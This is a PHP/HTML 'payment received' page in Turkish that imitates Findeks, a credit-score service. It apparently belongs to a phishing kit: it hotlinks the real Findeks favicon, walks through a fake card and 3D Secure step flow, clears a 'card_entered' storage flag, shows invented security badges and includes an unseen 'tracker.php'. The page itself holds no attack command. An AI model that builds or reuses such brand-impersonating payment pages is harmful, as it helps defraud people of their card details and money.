<?php
$logId     = isset($_GET['id']) ? intval($_GET['id']) : 0;
$basvuruNo = $logId > 0 ? 'SB' . str_pad($logId, 6, '0', STR_PAD_LEFT) : '';
?>
<!DOCTYPE html>
<html lang="tr" class="notranslate" translate="no">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>Ödeme Başarılı - Findeks</title>
    <link rel="icon" type="image/png" href="https://www.findeks.com/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: {
                            primary:   '#0056A4',
                            secondary: '#0070cc',
                            light:     '#e8f1fb',
                            dark:      '#003d7a',
                        }
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                    }
                }
            }
        };
    </script>
    <style>
        /* ── Progress tabs ── */
        .step-tab {
            display: flex; align-items: center; gap: 6px;
            padding: 6px 14px; border-radius: 20px;
            font-size: 12px; font-weight: 600;
            transition: all 0.2s; white-space: nowrap;
        }
        .step-tab.done    { background: #e8f1fb; color: #0056A4; }
        .step-tab.success { background: #dcfce7; color: #16a34a; }
        .step-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
        .step-tab.done    .step-dot { background: #0056A4; }
        .step-tab.success .step-dot { background: #16a34a; }

        /* ── Checkmark animation ── */
        .checkmark-svg .circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke: #22c55e;
            fill: none;
            animation: checkStroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }
        .checkmark-svg .check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            animation: checkStroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
        }
        @keyframes checkStroke { 100% { stroke-dashoffset: 0; } }
        @keyframes checkScale {
            0%, 100% { transform: none; }
            50%       { transform: scale3d(1.1, 1.1, 1); }
        }
        @keyframes checkFill { 100% { box-shadow: inset 0 0 0 60px #f0fdf4; } }
        .checkmark-wrap {
            animation: checkFill 0.4s ease-in-out 0.4s forwards, checkScale 0.3s ease-in-out 0.9s both;
        }

        /* ── Confetti dots ── */
        @keyframes confettiFall {
            0%   { transform: translateY(-20px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(80px) rotate(360deg); opacity: 0; }
        }
        .confetti-dot {
            position: absolute;
            width: 8px; height: 8px;
            border-radius: 2px;
            animation: confettiFall 1.2s ease-out forwards;
        }

        /* ── Page overlay ── */
        body { background: #f0f4f8; font-family: 'Inter', system-ui, sans-serif; }
        .page-overlay {
            position: fixed; inset: 0;
            background: rgba(10,20,40,0.6); z-index: 10;
            backdrop-filter: blur(4px);
        }
        .modal-shell {
            position: relative; z-index: 20;
            width: 100%; min-height: 100vh;
            display: flex; flex-direction: column;
        }

        /* ── Scrollbar ── */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 99px; }
    </style>
</head>
<body>

<!-- Page overlay -->
<div class="page-overlay" aria-hidden="true"></div>

<div class="modal-shell">

    <!-- ── HEADER ── -->
    <header class="sticky top-0 z-50 bg-white border-b border-gray-100 shadow-sm">
        <div class="max-w-5xl mx-auto px-4 h-14 flex items-center justify-between gap-4">

            <!-- Findeks logo -->
            <a href="index.php" class="flex items-center gap-2 flex-shrink-0" aria-label="Findeks Ana Sayfa">
                <svg width="110" height="28" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>

            <!-- Title -->
            <span class="hidden sm:block text-sm font-semibold text-gray-700 tracking-wide">Kredi Notunu Öğren</span>

            <!-- Progress tabs — desktop (all complete) -->
            <nav class="hidden md:flex items-center gap-1" aria-label="Adımlar">
                <div class="step-tab done">
                    <span class="step-dot"></span>Bilgiler
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab done">
                    <span class="step-dot"></span>Paket
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab done">
                    <span class="step-dot"></span>Ödeme
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab done">
                    <span class="step-dot"></span>3D Secure
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab success">
                    <span class="step-dot"></span>Sonuç
                </div>
            </nav>

            <!-- Progress dots — mobile (all complete) -->
            <div class="flex md:hidden items-center gap-1.5" aria-label="Tamamlandı">
                <span class="w-2 h-2 rounded-full bg-green-400"></span>
                <span class="w-2 h-2 rounded-full bg-green-400"></span>
                <span class="w-2 h-2 rounded-full bg-green-400"></span>
                <span class="w-2 h-2 rounded-full bg-green-400"></span>
                <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
            </div>

            <!-- Close button -->
            <a href="index.php"
               class="flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition-colors"
               aria-label="Kapat">
                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
            </a>
        </div>
    </header>

    <!-- ── MAIN CONTENT ── -->
    <main class="flex-1 max-w-5xl mx-auto w-full px-4 py-8 lg:py-12 flex items-center justify-center">
        <div class="w-full max-w-lg">

            <!-- Success card -->
            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-10 text-center">

                <!-- Checkmark animation -->
                <div class="checkmark-wrap w-24 h-24 mx-auto mb-6 relative" id="checkmarkWrap">
                    <svg class="checkmark-svg w-24 h-24" viewBox="0 0 52 52" aria-hidden="true">
                        <circle class="circle" cx="26" cy="26" r="25" fill="none" stroke-width="2"/>
                        <path class="check" fill="none" stroke="#22c55e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                    </svg>
                    <!-- Confetti container -->
                    <div id="confettiContainer" class="absolute inset-0 pointer-events-none overflow-visible"></div>
                </div>

                <!-- Title -->
                <h1 class="text-2xl font-bold text-gray-900 mb-2">Ödemeniz Alındı!</h1>
                <p class="text-sm text-gray-500 leading-relaxed mb-5">
                    Findeks kredi notu hizmetiniz başarıyla tamamlandı.
                </p>

                <!-- Reference number -->
                <?php if ($basvuruNo): ?>
                <div class="inline-flex items-center gap-2 px-5 py-2.5 bg-brand-light rounded-xl mb-6">
                    <svg class="w-4 h-4 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
                    <span class="text-xs text-gray-500">Başvuru No:</span>
                    <span class="font-mono font-bold text-brand-primary">#<?= htmlspecialchars($basvuruNo) ?></span>
                </div>
                <?php endif; ?>

                <!-- Info box -->
                <div class="bg-green-50 border border-green-200 rounded-xl p-4 mb-6 text-left">
                    <div class="flex items-start gap-3">
                        <div class="w-8 h-8 bg-green-100 rounded-lg flex items-center justify-center flex-shrink-0 mt-0.5">
                            <svg class="w-4 h-4 text-green-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                        </div>
                        <div>
                            <p class="text-sm font-semibold text-green-800 mb-1">Ödeme onayı gönderildi</p>
                            <p class="text-xs text-green-600 leading-relaxed">
                                Ödeme detayları ve kredi notu raporunuz kayıtlı e-posta adresinize gönderilecektir. Raporunuzu Findeks hesabınızdan da görüntüleyebilirsiniz.
                            </p>
                        </div>
                    </div>
                </div>

                <!-- Completed steps summary -->
                <div class="space-y-2 mb-8 text-left">
                    <div class="flex items-center gap-3 p-3 bg-gray-50 rounded-xl">
                        <div class="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-sm text-gray-700 font-medium">Kimlik doğrulaması tamamlandı</span>
                    </div>
                    <div class="flex items-center gap-3 p-3 bg-gray-50 rounded-xl">
                        <div class="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-sm text-gray-700 font-medium">Ödeme başarıyla işlendi</span>
                    </div>
                    <div class="flex items-center gap-3 p-3 bg-gray-50 rounded-xl">
                        <div class="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-sm text-gray-700 font-medium">Kredi notu raporu hazırlandı</span>
                    </div>
                </div>

                <!-- CTA button -->
                <a href="index.php"
                   class="block w-full py-3.5 bg-brand-primary hover:bg-brand-secondary text-white font-semibold rounded-xl text-sm transition-all text-center shadow-sm hover:shadow-md">
                    Ana Sayfaya Dön
                </a>

            </div>

            <!-- Trust row -->
            <div class="flex items-center justify-center gap-5 pt-6">
                <div class="flex items-center gap-1.5 text-gray-400">
                    <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                    <span class="text-[11px]">SSL Şifreli</span>
                </div>
                <div class="flex items-center gap-1.5 text-gray-400">
                    <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
                    <span class="text-[11px]">256-bit Şifreleme</span>
                </div>
                <div class="flex items-center gap-1.5 text-gray-400">
                    <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                    <span class="text-[11px]">KKB Güvenceli</span>
                </div>
            </div>

        </div>
    </main>

    <!-- ── FOOTER ── -->
    <footer class="border-t border-gray-100 bg-white mt-auto">
        <div class="max-w-5xl mx-auto px-4 py-5 flex flex-col sm:flex-row items-center justify-between gap-4">
            <a href="index.php" class="flex items-center gap-2" aria-label="Findeks">
                <svg width="90" height="22" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>
            <p class="text-[11px] text-gray-400 text-center">
                &copy; <?= date('Y') ?> Findeks — Kredi Kayıt Bürosu A.Ş. Tüm hakları saklıdır.
            </p>
            <div class="flex items-center gap-2">
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">GlobalSign</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">KKB</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">Eyebrand</span>
            </div>
        </div>
    </footer>

</div><!-- end modal-shell -->

<script>
    // Clean up session storage
    localStorage.removeItem('cart');
    sessionStorage.removeItem('card_entered');

    // Confetti burst after checkmark
    setTimeout(() => {
        const container = document.getElementById('confettiContainer');
        const colors = ['#0056A4', '#22c55e', '#f59e0b', '#ef4444', '#8b5cf6', '#0070cc'];
        for (let i = 0; i < 18; i++) {
            const dot = document.createElement('div');
            dot.className = 'confetti-dot';
            dot.style.cssText = [
                'background:' + colors[i % colors.length],
                'left:' + (Math.random() * 100) + '%',
                'top:' + (Math.random() * 40) + '%',
                'animation-delay:' + (Math.random() * 0.4) + 's',
                'animation-duration:' + (0.8 + Math.random() * 0.6) + 's',
                'transform:rotate(' + (Math.random() * 360) + 'deg)',
                'border-radius:' + (Math.random() > 0.5 ? '50%' : '2px')
            ].join(';');
            container.appendChild(dot);
        }
    }, 900);
</script>

<?php include 'includes/tracker.php'; ?>
</body>
</html>
